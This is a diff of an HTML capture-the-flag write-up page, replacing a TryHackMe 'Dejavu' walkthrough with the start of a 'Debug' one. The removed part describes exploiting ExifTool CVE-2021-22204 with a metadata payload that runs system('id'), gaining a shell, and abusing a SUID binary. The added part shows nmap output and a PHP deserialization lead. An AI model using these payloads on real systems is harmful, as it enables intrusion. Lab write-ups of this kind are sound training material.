@@ -9,17 +9,15 @@
       
       
       
-        <link rel="prev" href="../biohazard/">
+        <link rel="prev" href="../dejavu/">
       
-      
-        <link rel="next" href="../debug/">
       
       <link rel="icon" href="../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.4.3, mkdocs-material-9.1.18">
     
     
       
-        <title>Dejavu - THM Writeups | Vasanth Vanan</title>
+        <title>Debug - THM Writeups | Vasanth Vanan</title>
       
     
     
@@ -98,7 +96,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Dejavu
+              Debug
             
           </span>
         </div>
@@ -556,6 +554,20 @@
               
   
   
+  
+    <li class="md-nav__item">
+      <a href="../dejavu/" class="md-nav__link">
+        Dejavu
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
     
   
   
@@ -566,12 +578,12 @@
       
       
         <label class="md-nav__link md-nav__link--active" for="__toc">
-          Dejavu
+          Debug
           <span class="md-nav__icon md-icon"></span>
         </label>
       
       <a href="./" class="md-nav__link md-nav__link--active">
-        Dejavu
+        Debug
       </a>
       
         
@@ -613,26 +625,32 @@
     Privilege Escalation
   </a>
   
+    <nav class="md-nav" aria-label="Privilege Escalation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#gaining-user-access-james" class="md-nav__link">
+    Gaining user access (James)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gaining-root-access" class="md-nav__link">
+    Gaining root access
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
     </ul>
   
 </nav>
       
-    </li>
-  
-
-            
-          
-            
-              
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../debug/" class="md-nav__link">
-        Debug
-      </a>
     </li>
   
 
@@ -745,6 +763,26 @@
     Privilege Escalation
   </a>
   
+    <nav class="md-nav" aria-label="Privilege Escalation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#gaining-user-access-james" class="md-nav__link">
+    Gaining user access (James)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gaining-root-access" class="md-nav__link">
+    Gaining root access
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
     </ul>
@@ -765,9 +803,9 @@
   
 
 
-  <h1>Dejavu</h1>
+  <h1>Debug</h1>
 
-<p><a class="md-button" href="https://tryhackme.com/room/dejavu">TryHackMe Link</a></p>
+<p><a class="md-button" href="https://tryhackme.com/room/debug">TryHackMe Link</a></p>
 <div class="admonition example">
 <p class="admonition-title">Description</p>
 <p><p id="desc" style="font-size:15px"></p></p>
@@ -821,78 +859,60 @@
 <span class="normal">15</span>
 <span class="normal">16</span>
 <span class="normal">17</span>
-<span class="normal">18</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="w">  </span><span class="c1"># Nmap 7.93 scan initiated Sat Nov  4 10:50:58 2023 as: nmap -sC -sV -O -oN nmap.sh 10.10.46.35</span>
-<span class="w">  </span><span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="n">for</span><span class="w"> </span><span class="m">10.10</span><span class="n">.</span><span class="m">46.35</span>
-<span class="w">  </span><span class="n">Host</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="nf">up </span><span class="p">(</span><span class="m">0.34</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">)</span><span class="n">.</span>
-<span class="w">  </span><span class="n">Not</span><span class="w"> </span><span class="n">shown</span><span class="o">:</span><span class="w"> </span><span class="m">975</span><span class="w"> </span><span class="n">filtered</span><span class="w"> </span><span class="n">tcp</span><span class="w"> </span><span class="nf">ports </span><span class="p">(</span><span class="n">no</span><span class="o">-</span><span class="n">response</span><span class="p">),</span><span class="w"> </span><span class="m">23</span><span class="w"> </span><span class="n">filtered</span><span class="w"> </span><span class="n">tcp</span><span class="w"> </span><span class="nf">ports </span><span class="p">(</span><span class="n">admin</span><span class="o">-</span><span class="n">prohibited</span><span class="p">)</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="w">  </span><span class="c1"># Nmap 7.93 scan initiated Sat Nov 18 10:58:51 2023 as: nmap -sC -sV -O -oN nmap.sh 10.10.155.251</span>
+<span class="w">  </span><span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="n">for</span><span class="w"> </span><span class="m">10.10</span><span class="n">.</span><span class="m">155.251</span>
+<span class="w">  </span><span class="n">Host</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="nf">up </span><span class="p">(</span><span class="m">0.38</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">)</span><span class="n">.</span>
+<span class="w">  </span><span class="n">Not</span><span class="w"> </span><span class="n">shown</span><span class="o">:</span><span class="w"> </span><span class="m">998</span><span class="w"> </span><span class="n">closed</span><span class="w"> </span><span class="n">tcp</span><span class="w"> </span><span class="nf">ports </span><span class="p">(</span><span class="n">reset</span><span class="p">)</span>
 <span class="w">  </span><span class="n">PORT</span><span class="w">   </span><span class="n">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w"> </span><span class="n">VERSION</span>
-<span class="hll"><span class="w">  </span><span class="m">22</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="n">open</span><span class="w">  </span><span class="n">ssh</span><span class="w">     </span><span class="n">OpenSSH</span><span class="w"> </span><span class="m">8.0</span><span class="w"> </span><span class="p">(</span><span class="n">protocol</span><span class="w"> </span><span class="m">2.0</span><span class="p">)</span>
+<span class="hll"><span class="w">  </span><span class="m">22</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="n">open</span><span class="w">  </span><span class="n">ssh</span><span class="w">     </span><span class="n">OpenSSH</span><span class="w"> </span><span class="m">7.2</span><span class="n">p2</span><span class="w"> </span><span class="n">Ubuntu</span><span class="w"> </span><span class="m">4</span><span class="nf">ubuntu2.10 </span><span class="p">(</span><span class="n">Ubuntu</span><span class="w"> </span><span class="n">Linux</span><span class="p">;</span><span class="w"> </span><span class="n">protocol</span><span class="w"> </span><span class="m">2.0</span><span class="p">)</span>
 </span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="o">:</span><span class="w"> </span>
-<span class="w">  </span><span class="o">|</span><span class="w">   </span><span class="m">3072</span><span class="w"> </span><span class="m">300</span><span class="nf">f388d3bbe67f3e0caeb1c93ad1586 </span><span class="p">(</span><span class="n">RSA</span><span class="p">)</span>
-<span class="w">  </span><span class="o">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span><span class="m">4609662</span><span class="nf">b1fd1b93cd7e1730f2f334f74 </span><span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
-<span class="w">  </span><span class="o">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span><span class="nf">a8430ed2c1a9d114e09531a16294ed44 </span><span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
-<span class="hll"><span class="w">  </span><span class="m">80</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="n">open</span><span class="w">  </span><span class="n">http</span><span class="w">    </span><span class="n">Golang</span><span class="w"> </span><span class="n">net</span><span class="o">/</span><span class="n">http</span><span class="w"> </span><span class="nf">server </span><span class="p">(</span><span class="n">Go</span><span class="o">-</span><span class="n">IPFS</span><span class="w"> </span><span class="n">json</span><span class="o">-</span><span class="n">rpc</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="n">InfluxDB</span><span class="w"> </span><span class="n">API</span><span class="p">)</span>
-</span><span class="w">  </span><span class="o">|</span>_<span class="n">http</span><span class="o">-</span><span class="n">title</span><span class="o">:</span><span class="w"> </span><span class="n">Dog</span><span class="w"> </span><span class="n">Gallery</span><span class="o">!</span>
-<span class="w">  </span><span class="n">Warning</span><span class="o">:</span><span class="w"> </span><span class="n">OSScan</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">unreliable</span><span class="w"> </span><span class="n">because</span><span class="w"> </span><span class="n">we</span><span class="w"> </span><span class="n">could</span><span class="w"> </span><span class="n">not</span><span class="w"> </span><span class="n">find</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">least</span><span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="n">open</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="n">closed</span><span class="w"> </span><span class="n">port</span>
-<span class="w">  </span><span class="n">Aggressive</span><span class="w"> </span><span class="n">OS</span><span class="w"> </span><span class="n">guesses</span><span class="o">:</span><span class="w"> </span><span class="n">Linux</span><span class="w"> </span><span class="m">5.4</span><span class="w"> </span><span class="p">(</span><span class="m">91</span><span class="o">%), Linux 3.10 - 3.13 (90%</span><span class="p">),</span><span class="w"> </span><span class="n">Crestron</span><span class="w"> </span><span class="n">XPanel</span><span class="w"> </span><span class="n">control</span><span class="w"> </span><span class="nf">system </span><span class="p">(</span><span class="m">90</span><span class="o">%), ASUS RT-N56U WAP (Linux 3.4) (87%</span><span class="p">),</span><span class="w"> </span><span class="n">Linux</span><span class="w"> </span><span class="m">3.1</span><span class="w"> </span><span class="p">(</span><span class="m">87</span><span class="o">%), Linux 3.16 (87%</span><span class="p">),</span><span class="w"> </span><span class="n">Linux</span><span class="w"> </span><span class="m">3.2</span><span class="w"> </span><span class="p">(</span><span class="m">87</span><span class="o">%), HP P2000 G3 NAS device (87%</span><span class="p">),</span><span class="w"> </span><span class="n">AXIS</span><span class="w"> </span><span class="m">210</span><span class="n">A</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="m">211</span><span class="w"> </span><span class="n">Network</span><span class="w"> </span><span class="nf">Camera </span><span class="p">(</span><span class="n">Linux</span><span class="w"> </span><span class="m">2.6</span><span class="n">.</span><span class="m">17</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="m">87</span><span class="o">%), Adtran 424RG FTTH gateway (86%</span><span class="p">)</span>
-<span class="w">  </span><span class="n">No</span><span class="w"> </span><span class="n">exact</span><span class="w"> </span><span class="n">OS</span><span class="w"> </span><span class="n">matches</span><span class="w"> </span><span class="n">for</span><span class="w"> </span><span class="nf">host </span><span class="p">(</span><span class="n">test</span><span class="w"> </span><span class="n">conditions</span><span class="w"> </span><span class="n">non</span><span class="o">-</span><span class="n">ideal</span><span class="p">)</span><span class="n">.</span>
+<span class="w">  </span><span class="o">|</span><span class="w">   </span><span class="m">2048</span><span class="w"> </span><span class="m">44</span><span class="nf">ee1eba072a5469ff11e349d7dba901 </span><span class="p">(</span><span class="n">RSA</span><span class="p">)</span>
+<span class="w">  </span><span class="o">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span><span class="m">8</span><span class="nf">b2a8fd8409533d5fa7a406a7f29e403 </span><span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
+<span class="w">  </span><span class="o">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span><span class="m">6559e4402</span><span class="nf">ac2d70577b3af60dacdfc67 </span><span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
+<span class="hll"><span class="w">  </span><span class="m">80</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="n">open</span><span class="w">  </span><span class="n">http</span><span class="w">    </span><span class="n">Apache</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="m">2.4</span><span class="n">.</span><span class="m">18</span><span class="w"> </span><span class="p">((</span><span class="n">Ubuntu</span><span class="p">))</span>
+</span><span class="w">  </span><span class="o">|</span>_<span class="n">http</span><span class="o">-</span><span class="n">title</span><span class="o">:</span><span class="w"> </span><span class="n">Apache2</span><span class="w"> </span><span class="n">Ubuntu</span><span class="w"> </span><span class="n">Default</span><span class="w"> </span><span class="n">Page</span><span class="o">:</span><span class="w"> </span><span class="n">It</span><span class="w"> </span><span class="n">works</span>
+<span class="w">  </span><span class="o">|</span>_<span class="n">http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="o">:</span><span class="w"> </span><span class="n">Apache</span><span class="o">/</span><span class="m">2.4</span><span class="n">.</span><span class="m">18</span><span class="w"> </span><span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
+<span class="w">  </span><span class="n">No</span><span class="w"> </span><span class="n">exact</span><span class="w"> </span><span class="n">OS</span><span class="w"> </span><span class="n">matches</span><span class="w"> </span><span class="n">for</span><span class="w"> </span><span class="nf">host </span><span class="p">(</span><span class="n">If</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">know</span><span class="w"> </span><span class="n">what</span><span class="w"> </span><span class="n">OS</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">running</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">it</span><span class="p">,</span><span class="w"> </span><span class="n">see</span><span class="w"> </span><span class="n">https</span><span class="o">://</span><span class="n">nmap.org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span><span class="w"> </span><span class="p">)</span><span class="n">.</span>
+<span class="w">  </span><span class="n">TCP</span><span class="o">/</span><span class="n">IP</span><span class="w"> </span><span class="n">fingerprint</span><span class="o">:</span>
+<span class="w">  </span><span class="n">OS</span><span class="o">:</span><span class="nf">SCAN</span><span class="p">(</span><span class="n">V</span><span class="o">=</span><span class="m">7.93</span><span class="o">%E=4%</span><span class="n">D</span><span class="o">=</span><span class="m">11</span><span class="o">/</span><span class="m">18</span><span class="o">%OT=22%</span><span class="n">CT</span><span class="o">=</span><span class="m">1</span><span class="o">%CU=36574%</span><span class="n">PV</span><span class="o">=</span><span class="n">Y</span><span class="o">%DS=5%</span><span class="n">DC</span><span class="o">=</span><span class="n">I</span><span class="o">%G=Y%</span><span class="n">TM</span><span class="o">=</span><span class="m">6558</span><span class="n">DF</span>
+<span class="w">  </span><span class="n">OS</span><span class="o">:</span><span class="m">68</span><span class="o">%P=aarch64-unknown-linux-gnu)SEQ(SP=109%</span><span class="n">GCD</span><span class="o">=</span><span class="m">1</span><span class="o">%ISR=10A%</span><span class="n">TI</span><span class="o">=</span><span class="n">Z</span><span class="o">%II=I%</span><span class="n">TS</span><span class="o">=</span><span class="n">A</span><span class="p">)</span><span class="n">S</span>
+<span class="w">  </span><span class="n">OS</span><span class="o">:</span><span class="nf">EQ</span><span class="p">(</span><span class="n">SP</span><span class="o">=</span><span class="m">109</span><span class="o">%GCD=1%</span><span class="n">ISR</span><span class="o">=</span><span class="m">10</span><span class="n">A</span><span class="o">%TI=Z%</span><span class="n">CI</span><span class="o">=</span><span class="n">I</span><span class="o">%II=I%</span><span class="n">TS</span><span class="o">=</span><span class="n">A</span><span class="p">)</span><span class="nf">OPS</span><span class="p">(</span><span class="n">O1</span><span class="o">=</span><span class="n">M508ST11NW6</span><span class="o">%O2=M508ST</span>
+<span class="o">  OS:11NW6%</span><span class="n">O3</span><span class="o">=</span><span class="n">M508NNT11NW6</span><span class="o">%O4=M508ST11NW6%</span><span class="n">O5</span><span class="o">=</span><span class="n">M508ST11NW6</span><span class="o">%O6=M508ST11)WIN(W1=6</span>
+<span class="o">  OS:8DF%</span><span class="n">W2</span><span class="o">=</span><span class="m">68</span><span class="n">DF</span><span class="o">%W3=68DF%</span><span class="n">W4</span><span class="o">=</span><span class="m">68</span><span class="n">DF</span><span class="o">%W5=68DF%</span><span class="n">W6</span><span class="o">=</span><span class="m">68</span><span class="n">DF</span><span class="p">)</span><span class="nf">ECN</span><span class="p">(</span><span class="n">R</span><span class="o">=</span><span class="n">Y</span><span class="o">%DF=Y%</span><span class="bp">T</span><span class="o">=</span><span class="m">40</span><span class="o">%W=6903%</span><span class="n">O</span><span class="o">=</span><span class="n">M</span>
+<span class="w">  </span><span class="n">OS</span><span class="o">:</span><span class="m">508</span><span class="n">NNSNW6</span><span class="o">%CC=Y%</span><span class="n">Q</span><span class="o">=</span><span class="p">)</span><span class="nf">T1</span><span class="p">(</span><span class="n">R</span><span class="o">=</span><span class="n">Y</span><span class="o">%DF=Y%</span><span class="bp">T</span><span class="o">=</span><span class="m">40</span><span class="o">%S=O%</span><span class="n">A</span><span class="o">=</span><span class="n">S</span><span class="o">+%F=AS%</span><span class="n">RD</span><span class="o">=</span><span class="m">0</span><span class="o">%Q=)T2(R=N)T3(R=N)T</span>
+<span class="o">  OS:4(R=Y%</span><span class="n">DF</span><span class="o">=</span><span class="n">Y</span><span class="o">%T=40%</span><span class="n">W</span><span class="o">=</span><span class="m">0</span><span class="o">%S=A%</span><span class="n">A</span><span class="o">=</span><span class="n">Z</span><span class="o">%F=R%</span><span class="n">O</span><span class="o">=%RD=0%</span><span class="n">Q</span><span class="o">=</span><span class="p">)</span><span class="nf">T5</span><span class="p">(</span><span class="n">R</span><span class="o">=</span><span class="n">Y</span><span class="o">%DF=Y%</span><span class="bp">T</span><span class="o">=</span><span class="m">40</span><span class="o">%W=0%</span><span class="n">S</span><span class="o">=</span><span class="n">Z</span><span class="o">%A=S+</span>
+<span class="o">  OS:%</span><span class="bp">F</span><span class="o">=</span><span class="n">AR</span><span class="o">%O=%</span><span class="n">RD</span><span class="o">=</span><span class="m">0</span><span class="o">%Q=)T6(R=Y%</span><span class="n">DF</span><span class="o">=</span><span class="n">Y</span><span class="o">%T=40%</span><span class="n">W</span><span class="o">=</span><span class="m">0</span><span class="o">%S=A%</span><span class="n">A</span><span class="o">=</span><span class="n">Z</span><span class="o">%F=R%</span><span class="n">O</span><span class="o">=%RD=0%</span><span class="n">Q</span><span class="o">=</span><span class="p">)</span><span class="nf">T7</span><span class="p">(</span><span class="n">R</span><span class="o">=</span><span class="n">Y</span><span class="o">%DF=Y</span>
+<span class="o">  OS:%</span><span class="bp">T</span><span class="o">=</span><span class="m">40</span><span class="o">%W=0%</span><span class="n">S</span><span class="o">=</span><span class="n">Z</span><span class="o">%A=S+%</span><span class="bp">F</span><span class="o">=</span><span class="n">AR</span><span class="o">%O=%</span><span class="n">RD</span><span class="o">=</span><span class="m">0</span><span class="o">%Q=)U1(R=Y%</span><span class="n">DF</span><span class="o">=</span><span class="n">N</span><span class="o">%T=40%</span><span class="n">IPL</span><span class="o">=</span><span class="m">164</span><span class="o">%UN=0%</span><span class="n">RIPL</span><span class="o">=</span><span class="n">G</span><span class="o">%</span>
+<span class="o">  OS:RID=G%</span><span class="n">RIPCK</span><span class="o">=</span><span class="n">G</span><span class="o">%RUCK=G%</span><span class="n">RUD</span><span class="o">=</span><span class="n">G</span><span class="p">)</span><span class="nf">IE</span><span class="p">(</span><span class="n">R</span><span class="o">=</span><span class="n">Y</span><span class="o">%DFI=N%</span><span class="bp">T</span><span class="o">=</span><span class="m">40</span>%<span class="n">CD</span><span class="o">=</span><span class="n">S</span><span class="p">)</span>
+
+<span class="w">  </span><span class="n">Network</span><span class="w"> </span><span class="n">Distance</span><span class="o">:</span><span class="w"> </span><span class="m">5</span><span class="w"> </span><span class="n">hops</span>
+<span class="w">  </span><span class="n">Service</span><span class="w"> </span><span class="n">Info</span><span class="o">:</span><span class="w"> </span><span class="n">OS</span><span class="o">:</span><span class="w"> </span><span class="n">Linux</span><span class="p">;</span><span class="w"> </span><span class="n">CPE</span><span class="o">:</span><span class="w"> </span><span class="n">cpe</span><span class="o">:/</span><span class="n">o</span><span class="o">:</span><span class="n">linux</span><span class="o">:</span><span class="n">linux_kernel</span>
 
 <span class="w">  </span><span class="n">OS</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">Service</span><span class="w"> </span><span class="n">detection</span><span class="w"> </span><span class="n">performed.</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="n">any</span><span class="w"> </span><span class="n">incorrect</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">https</span><span class="o">://</span><span class="n">nmap.org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span><span class="w"> </span><span class="n">.</span>
-<span class="w">  </span><span class="c1"># Nmap done at Sat Nov  4 10:51:50 2023 -- 1 IP address (1 host up) scanned in 52.43 seconds</span>
+<span class="w">  </span><span class="c1"># Nmap done at Sat Nov 18 10:59:36 2023 -- 1 IP address (1 host up) scanned in 45.84 seconds</span>
 </code></pre></div></td></tr></table></div></li>
 </ul>
 <h2 id="enumeration"><b>Enumeration</b><a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h2>
-<p>The Dejavu room presented two open ports, <code>SSH</code> and <code>HTTP</code>, both on their default ports. Upon accessing port 80, I encountered a web interface designed for showcasing dog images. It was very obivous that the developer had intended to create a dog image gallery. </p>
+<p>In the initial exploration, I visited the default HTTP port 80 and encountered a website displaying the typical Apache welcome page. </p>
 <p><img id="image1" /></p>
-<p>This box was designed to provide a guided walkthrough, simplifying the process of obtaining flags by asking questions.</p>
-<ul>
-<li><mark class="critic"><strong>What page can be used to upload your own dog picture?</strong></mark></li>
-</ul>
-<p><code>/upload/</code> Self explanatory. To locate the page for uploading your own dog picture, I navigated to /upload/. This was a straightforward find, and I used the dirsearch tool to enumerate hidden directories.</p>
-<ul>
-<li><mark class="critic"><strong>What API route is used to provide the Title and Caption for a specific dog image?</strong></mark></li>
-</ul>
-<p><code>/dog/getmetadata</code>. This can be found in the javascript files linked to the website. Additionally, One can check it through burp-suite as suggested in the hint section</p>
-<ul>
-<li><mark class="critic"><strong>What API route does the application use to retrieve further information about the dog picture?</strong></mark></li>
-</ul>
-<p><code>/dog/getexifdata</code>. Similarly I captured the HTTP GET requests and analysed it.</p>
+<p>Then, I used the feroxbuster tool for directory enumeration that revealed a hidden directory named <strong>backup</strong> within the <code>/html</code> directory.</p>
 <p><img id="image2" /></p>
-<ul>
-<li><mark class="critic"><strong>What attribute in the JSON response from this endpoint specifies the version of ExifTool being used by the webapp?</strong></mark></li>
-</ul>
-<p><code>ExifToolVersion</code></p>
-<ul>
-<li><mark class="critic"><strong>What version of ExifTool is in use?</strong></mark></li>
-</ul>
-<p><code>12.23</code></p>
+<p>Within this directory, I discovered a backup file containing <code>PHP</code> and HTML-related files. </p>
 <p><img id="image3" /></p>
-<ul>
-<li><mark class="critic"><strong>What RCE exploit is present in this version of ExifTool? Give the CVE number in format CVE-XXXX-XXXXX</strong></mark></li>
-</ul>
-<p>The critical turning point of this box was the discovery of a CVE (Common Vulnerabilities and Exposures) related to <code>ExifTool</code> version <code>12.23</code>. I quickly searched online and found the relevant CVE: <code>CVE-2021-22204</code>. This CVE involved arbitrary remote code execution through Python.</p>
-<p><img id="image4" /></p>
-<h2 id="initial-access"><b>Initial Access</b><a class="headerlink" href="#initial-access" title="Permanent link">&para;</a></h2>
-<p>As I went deeper into the vulnerability, I uncovered more details. The vulnerability originated from the <code>eval()</code> function in Perl, as Perl was used in ExifTool. The issue was described as </p>
-<div class="admonition danger">
-<p class="admonition-title">Vulnerability</p>
-<p><p id="desc" style="font-size:15px">"Improper neutralization of user data in the DjVu file format in ExifTool versions 7.44 and up allows arbitrary code execution when parsing the malicious image."</p></p>
-</div>
-<p>I proceeded to clone the existing code from searchsploit and attempted to execute it against the target website. </p>
-<p><img id="image5" /></p>
-<p>To exploit this vulnerability, the Python code utilized the following payload to generate an image:</p>
-<div class="highlight"><pre><span></span><code><span class="p">(</span><span class="n">metadata</span> <span class="s2">&quot;\c${system(&#39;id&#39;)};&quot;</span><span class="p">)</span>
-</code></pre></div>
-<p>I then uploaded the image to the <code>/upload/</code> section and set up a listener on my end to capture the request when I accessed the image. </p>
-<p><img id="image6" /></p>
-<p>The moment I clicked on that image, I gained limited shell access as the user <code>dogpics</code></p>
-<p><img id="image7" />
-<img id="image8" /></p>
-<p>✅ User Flag obtained. </p>
-<h2 id="privilege-escalation"><b>Privilege Escalation</b><a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h2>
-<p>Subsequently, it was time to escalate privileges using existing vulnerabilities. The room had already provided a clue on how to achieve this. It guided me to exploit an <code>SUID binary</code> with <code>path manipulation</code>. In the same folder, I found a <code>ServerManager</code> binary and its associated <code>ServerManager</code> C file. </p>
-<p><img id="image9" /></p>
-<p>This was a white-box testing opportunity. I inspected the code and analyzed its behavior. It attempted to use the <strong>system()</strong> command in C language to run <strong>systemctl</strong>. </p>
+<p>I smelled a rat particularly around a PHP file hinting at a <code>PHP deserialization</code> vulnerability. Analyzing the code, I identified a PHP class associated with an HTML form comprising two variables, namely <code>form_file</code> and <code>message</code>.</p>
 <div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
 <span class="normal"> 2</span>
 <span class="normal"> 3</span>
@@ -917,69 +937,103 @@
 <span class="normal">22</span>
 <span class="normal">23</span>
 <span class="normal">24</span>
-<span class="normal">25</span>
-<span class="normal">26</span>
-<span class="normal">27</span>
-<span class="normal">28</span>
-<span class="normal">29</span>
-<span class="normal">30</span>
-<span class="normal">31</span>
-<span class="normal">32</span>
-<span class="normal">33</span>
-<span class="normal">34</span>
-<span class="normal">35</span>
-<span class="normal">36</span>
-<span class="normal">37</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+<span class="normal">25</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="cp">&lt;?php</span>
 
-<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
-<span class="p">{</span><span class="w">   </span>
-<span class="w">    </span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-<span class="w">    </span><span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-<span class="w">    </span><span class="n">printf</span><span class="p">(</span>
-<span class="w">        </span><span class="s">&quot;Welcome to the DogPics server manager Version 1.0</span><span class="se">\n</span><span class="s">&quot;</span>
-<span class="w">        </span><span class="s">&quot;Please enter a choice:</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">operation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
-<span class="w">    </span><span class="n">printf</span><span class="p">(</span>
-<span class="w">        </span><span class="s">&quot;0 -</span><span class="se">\t</span><span class="s">Get server status</span><span class="se">\n</span><span class="s">&quot;</span>
-<span class="w">        </span><span class="s">&quot;1 -</span><span class="se">\t</span><span class="s">Restart server</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-<span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">operation</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">48</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">operation</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">49</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="n">operation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getchar</span><span class="p">();</span>
-<span class="w">        </span><span class="n">getchar</span><span class="p">();</span>
-<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">operation</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">48</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">operation</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">49</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Invalid choice.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-<span class="w">        </span><span class="p">}</span>
-<span class="w">    </span><span class="p">}</span>
-<span class="w">    </span><span class="n">operation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">operation</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">48</span><span class="p">;</span>
-<span class="w">    </span><span class="c1">//printf(&quot;Choice was:\t%d\n&quot;,operation);</span>
-<span class="w">    </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="n">operation</span><span class="p">)</span>
-<span class="w">    </span><span class="p">{</span>
-<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="mi">0</span><span class="p">:</span>
-<span class="w">        </span><span class="c1">//printf(&quot;0\n&quot;);</span>
-<span class="hll"><span class="w">        </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;systemctl status --no-pager dogpics&quot;</span><span class="p">);</span>
-</span><span class="w">        </span><span class="k">break</span><span class="p">;</span>
-<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="mi">1</span><span class="p">:</span>
-<span class="hll"><span class="w">        </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;systemctl restart dogpics&quot;</span><span class="p">);</span>
-</span><span class="w">        </span><span class="k">break</span><span class="p">;</span>
-<span class="w">    </span><span class="k">default</span><span class="o">:</span>
-<span class="w">        </span><span class="k">break</span><span class="p">;</span>
-<span class="w">    </span><span class="p">}</span>
